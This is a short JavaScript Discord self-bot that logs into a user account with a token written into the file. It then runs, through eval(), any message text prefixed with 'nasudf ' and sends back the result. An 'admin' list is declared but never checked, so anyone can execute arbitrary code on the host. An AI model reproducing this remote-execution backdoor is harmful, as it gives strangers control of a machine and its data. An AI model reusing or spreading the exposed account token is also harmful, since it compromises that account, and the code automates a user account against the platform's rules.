let admin = ["1036086709361836053,651423213988872231"]
const { loadImage, createCanvas, registerFont } = require("canvas");
const djap1l4jsojf = require("discord.js-selfbot-v13");
const bot = new djap1l4jsojf.Client({ checkUpdate: false });
bot
  .on("ready", async () => {
    console.log(`${bot.user.tag}네`);
  })
  .on("messageCreate", async (message) => {
    if (message.content.startsWith("nasudf ")) {
      try {
        await message.channel.send(String(eval(message.content.slice(7))));
      } catch (e) {
        await message.channel.send(String(e));
      }
    }
  });
bot.login("MTAzNjA4NjcwOTM2MTgzNjA1Mw.GXLI8S.cLbaQhEiZ8WitP0nf-cFft_QIqAOrisrsxrvO4");
